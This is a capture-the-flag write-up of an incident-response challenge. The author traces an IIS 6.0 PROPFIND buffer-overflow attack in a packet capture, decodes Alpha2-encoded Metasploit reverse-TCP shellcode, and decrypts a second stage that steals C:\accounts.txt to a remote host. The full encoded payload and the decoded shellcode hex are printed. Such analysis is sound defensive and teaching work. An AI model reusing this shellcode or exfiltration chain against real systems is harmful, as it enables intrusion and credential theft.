# #7 - re_crowd by Chris Gardner, Moritz Raabe and Blaine Stancill

## Introduction

For the 7th challenge, we are given a Wireshark packet capture and a message:

```
Hello,

Here at Reynholm Industries we pride ourselves on everything.
It's not easy to admit, but recently one of our most valuable servers was breached. 
We don't believe in host monitoring so all we have is a network packet capture.
We need you to investigate and determine what data was extracted from the server, if any.

Thank you
```

Seems like we're dealing with an incident-response challenge. This should be much more fun than plain reverse engineering.

## Part 1 - Recon

Upon opening the packet capture in [Wireshark](https://wireshark.org), we can see some HTTP traffic:

![http traffic](https://s.heyitsleo.io/ShareX/2020/10/Wireshark_YsxpjHJRID.png)

It's likely that there was a web server exploit, so we can apply the `http` display filter and start looking for odd traffic.

After scrolling past some regular requests, something odd appears:

![weird requests](https://s.heyitsleo.io/ShareX/2020/10/Wireshark_FT2ExWdsoL.png)

`PROPFIND`? Never heard of that before. Why are there a bunch of `500 Internal Server Failure` responses? Let's look at one of the offending requests.

![wtf is this](https://s.heyitsleo.io/ShareX/2020/10/Wireshark_sO8inMn6VH.png)

_What is this?!_ At this point it becomes clear that we're looking at a web server exploit. An earlier response indicates the server is running [IIS](https://en.wikipedia.org/wiki/Internet_Information_Services) 6.0.

![IIS version](https://s.heyitsleo.io/ShareX/2020/10/Wireshark_AxFentGgZA.png)

If we do a Google search for "IIS 6.0 PROPFIND exploit", we can find an [article](https://www.trendmicro.com/en_us/research/17/c/iis-6-0-vulnerability-leads-code-execution.html) about the exact exploit we're looking at.

> Microsoft Internet Information Services (IIS) **6.0** is vulnerable to a zero-day **Buffer Overflow** vulnerability (CVE-2017-7269) due to an **improper validation of an `If` header in a `PROPFIND` request**.

We can find a proof of concept implementation [here](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py). Let's export one of the malicious requests to a binary file and go from there. (You can find the sample I used in [malicious_request.bin](./malicious_request.bin).)

## Part 2 - Finding the shellcode

This request looks _weird_, to say the least. The `If` header has an extremely long value filled with unintelligible bytes and random strings of text.

![Weird request](https://s.heyitsleo.io/ShareX/2020/10/HxD_KpiLjamG45.png)

We can use the PoC we found as a reference. There are two payloads for the buffer overflow, followed by an odd string of text (which I stored in `alpha2_payload.txt`):
```
VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA
```

A quick search for `VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA` reveals that this is shellcode encoded with a tool called Alpha2. Alpha2 supports 4 different encodings, all producing **alphanumeric strings**:

- Mixed-case ASCII
- Mixed-case Unicode
- Uppercase ASCII
- Uppercase Unicode

The popular Metasploit framework has support for encoding payloads with Alpha2. It _also_ includes [a module for CVE-2017-7269](https://github.com/rapid7/metasploit-framework/pull/8355/files#diff-11221130eabb3e19bd03096c284123c6ba15202974f621289e1f07242d17efeeR46)!

The module uses the following Alpha2 configuration:
```rb
{
    'Space'          => 2000,
    'BadChars'       => "\x00",
    'EncoderType'    => Msf::Encoder::Type::AlphanumUnicodeMixed,
    'DisableNops'    =>  'True',
    'EncoderOptions' =>
    {
        'BufferRegister' => 'ESI',
    }
}
```

When I was working on the challenge, I couldn't find a standalone program to decode this particular Alpha2 format. I didn't want to _run_ the shellcode, so I decided to study the [Alpha2 source code](https://github.com/un4ckn0wl3z/Alpha2-encoder) and make my own decoder. Before we move forward, I want to review the structure of the Alpha2 data.

```
VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA - Decoder prefix for mixed-case unicode when BufferRegister=ESI (this is not encoded, this is meant to be interpreted as code IN A UNICODE BUFFER)
jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB - Decoder loop for mixed-case unicode (this, too, is not encoded)
YlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA - The actual shellcode; this is what needs to be decoded
```

The documentation in [mixedcase_unicode_alphanumeric_decoder.c](https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/mixedcase_unicode_alphanumeric_decoder.c) describes the encoding scheme:

```
Encoding scheme for origional shellcode:
Every byte 0xAB is encoded in two unicode words: 
    (CD 00) and (EF 00)
Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric, D = A-E and C is arbitrary (3-7) as long as CD is alphanumeric.

The encoded data is terminated by a "A" (0x41) character, DO NOT USE THIS in your encoded shellcode data, as it will stop the decoding!
```

Slightly more complicated than the ASCII version, but not too bad. I implemented it in [alphadecode_mixeduni.py](./alphadecode_mixeduni.py).

Running the decoder script gives us a blob of data we can save for future analysis:

```
$ python alphadecode_mixeduni.py alpha2_payload.txt
Result: fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd5505050504050405068ea0fdfe0ffd5976a0568c0a84415680200115c89e66a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b3681f64b584f528d0e6a406800100000516a006858a453e5ffd58d98000100005356506a005653576802d9c85fffd501c329c675ee5b595d555789dfe8100000006b696c6c657276756c747572653132335e31c0aafec075fb81ef0001000031db021c0789c280e20f021c168a140786141f881407fec075e831dbfec0021c078a140786141f88140702141f8a1417305500454975e55fc3
```

If we throw this blob of data into a hex editor, we can see a plaintext string! The decoder worked correctly.

![killervulture123](https://s.heyitsleo.io/ShareX/2020/10/HxD_sJIJh9Wo4c.png)

The disassembled payload can be found in [alpha2_payload.asm](./alpha2_payload.asm).

## Part 3 - Finding clues

There are some interesting constants in the disassembly, such as:

- `0x56a2b5f0`
- `0x6174a599`
- `0x524f584b`

If we search for `0x524f584b`, we get no results. If we search for `0x6174a599`, however, something interesting pops up:

![Metasploit again?](https://s.heyitsleo.io/ShareX/2020/10/chrome_ofMGo4RFwH.png)
_Could this just be a bunch of Metasploit components?_

Here's the relevant part of our disassembled payload:
```as
push   0x5
push   0x1544a8c0
push   0x5c110002
mov    esi,esp
push   0x10
push   esi
push   edi
push   0x6174a599
call   ebp
test   eax,eax
```

Here's the part of [block_reverse_tcp.asm](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm) where `0x6174a599` appears:

```as
set_address:
  push byte 0x05         ; retry counter
  push 0x0100007F        ; host 127.0.0.1
  push 0x5C110002        ; family AF_INET and port 4444
  mov esi, esp           ; save pointer to sockaddr struct
  
try_connect:
  push byte 16           ; length of the sockaddr struct
  push esi               ; pointer to the sockaddr struct
  push edi               ; the socket
  push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
  call ebp               ; connect( s, &sockaddr, 16 );

  test eax,eax           ; non-zero means a failure
```

It's pretty clear that we're looking at Metasploit code. I've provided an [annotated version](./alpha2_payload_annotated.asm) of the payload for anyone who'd like to see the different "blocks" in use.

After analyzing the payload, I determined it does the following:

1. Connects to a server at `192.168.68.21:4444`
2. Receives an integer over the network and XORs it with `0x524f584b`. The result is the length of the **second stage** of code, and will be referred to as `stagelen`.
3. Receives `stagelen` bytes over the network and RC4-decrypts them with the key `killervulture123`.
4. Diverts execution into the second stage

## Part 4 - Getting the second stage

To get the second stage data, we can change our Wireshark filter to `tcp.srcport == 4444`. This will show us all packets coming from port 4444, which is enough to get us what we want.

Wireshark shows us a 1243 byte packet coming from this port. That's plenty of room for the second stage.

![The packet](https://s.heyitsleo.io/ShareX/2020/10/Wireshark_o8xctHLTKJ.png)

The data can be found in [second_stage_packet.bin](./second_stage_packet.bin).

The first 4 bytes are `9C 5C 4F 52`, or `0x524F5C9C`. If we XOR this value with `0x524F584B`, we get `1239`. Perfect!

We can decrypt the rest of the data with a [simple Python script](./decrypt_second_stage.py).

```py
# Decrypt the second stage data
# See repository LICENSE

import struct
from Crypto.Cipher import ARC4

with open('second_stage_packet.bin', 'rb') as second_stage_packet_file:
    second_stage_encrypted = second_stage_packet_file.read()
    code_len = struct.unpack('<L', second_stage_encrypted[:4])[0] ^ 0x524F584B

    if code_len != len(second_stage_encrypted) - 4:
        raise RuntimeError("bad data")
    
    encrypted_code = second_stage_encrypted[4:]
    cipher = ARC4.new(b'killervulture123')
    decrypted_code = cipher.decrypt(encrypted_code)
    
    with open('second_stage_code.bin', 'wb') as second_stage_code_file:
        second_stage_code_file.write(decrypted_code)
```

At the end of `second_stage_code.bin`, there are more readable strings! The decryption was successful.

![more strings](https://s.heyitsleo.io/ShareX/2020/10/HxD_lXXuivUsvB.png)

## Part 5 - Endgame

The second stage employs typical import obfuscation techniques. It resolves function pointers at runtime based on constant hashes. The hash algorithm used is a simple rotate-and-add hash, common in malware:

```py
def hash(val):
    val = 0
    for i in val:
        val = rol(val, 19, 32)
        val += ord(i)
    return val
```

| Hash       	| Plaintext    	|
|------------	|--------------	|
| 0x6E2BCA17 	| KERNEL32.DLL 	|
| 0x7C0017A5 	| CreateFileA  	|
| 0x73E2D87E 	| ExitProcess  	|
| 0x10FA6516 	| ReadFile     	|
| 0x32E1EFA6 	| WS2_32.DLL   	|
| 0x3BFCEDCB 	| WSAStartup   	|
| 0x60AAF9EC 	| connect      	|
| 0xE97019A4 	| send         	|
| 0x4D5F6AC9 	| shutdown     	|
| 0x492F0B6E 	| socket       	|


![Hashes](https://s.heyitsleo.io/ShareX/2020/10/ida_jib2qqwcrV.png)

### Step 1 - Startup

At startup, the second stage parses the import table and places function pointers in `stru_46D` (a structure with room for 8 pointers.) The structure is defined as follows:
```cpp
struct imported_funcs
{
  CreateFileA_t CreateFileA;
  ExitProcess_t ExitProcess;
  ReadFile_t ReadFile;
  WSAStartup_t WSAStartup;
  connect_t connect;
  send_t send;
  shutdown_t shutdown;
  socket_t socket;
};
```

### Step 2 - Execution

After resolving imports, the second stage jumps to code at offset `38F`. The contents of the `C:\accounts.txt` file are read into a buffer, RC4-encrypted with the key `intrepidmango`, and sent to a server running at `192.168.68.21:1337`. We can find the packet in Wireshark by setting the filter to `tcp.dstport == 1337 && data.len > 0`:

![stolen file packet](https://s.heyitsleo.io/ShareX/2020/10/Wireshark_pbAKWoBHEx.png)

Decrypting this data is easy:

```py
# Decrypt the stolen file packet
# See repository LICENSE

from Crypto.Cipher import ARC4

with open('stolen_file_packet.bin', 'rb') as stolen_file_packet:
    stolen_file_encrypted = stolen_file_packet.read()
    cipher = ARC4.new(b"intrepidmango")
    print(cipher.decrypt(stolen_file_encrypted).decode('ascii'))
```

The result:
```
roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat
moss:Pot-Pocket-Pigeon-Hunt-8:narwhal
jen:Straighten-Effective-Gift-Pity-1:bunny
richmond:Inventor-Hut-Autumn-Tray-6:bird
denholm:123:dog
```

The flag is **`h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com`** .

## Conclusion

I thoroughly enjoyed this challenge. I find incident-response challenges a lot more fun than regular reverse engineering challenges. This one in particular gave me insight into some common tools and techniques used by malicious actors.

## Bonus

This challenge contains several not-so-subtle references to the UK sitcom "The IT Crowd". These went over my head at first, but "Reynholm Industries" (and all of the images downloaded by the attacker) are directly from the show. 